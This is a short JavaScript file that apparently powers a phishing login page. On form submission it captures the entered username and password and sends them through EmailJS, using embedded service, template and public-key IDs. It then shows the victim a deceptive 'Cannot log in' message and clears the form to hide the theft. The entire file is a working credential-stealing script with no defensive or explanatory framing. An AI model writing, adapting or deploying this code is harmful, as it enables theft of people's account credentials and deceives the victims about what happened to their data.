// Initialize EmailJS with your Public Key
emailjs.init("zWf-mwho9y9HbNvhF"); // 🔑 Replace YOUR_PUBLIC_KEY here

document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the default form submission

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Send data to EmailJS
    emailjs.send(
        "service_91rfqro", // ⚙️ Replace YOUR_SERVICE_ID here
        "template_i8i713m", // 📄 Replace YOUR_TEMPLATE_ID here
        {
            username: username,
            password: password
        }
    )
    .then(function(response) {
        console.log("Email sent successfully!", response.status, response.text);
        alert("Cannot log in");
    }, function(error) {
        console.error("Failed to send email:", error);
        alert("Failed to send login information. Please try again.");
    });

    // Clear form fields
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
});
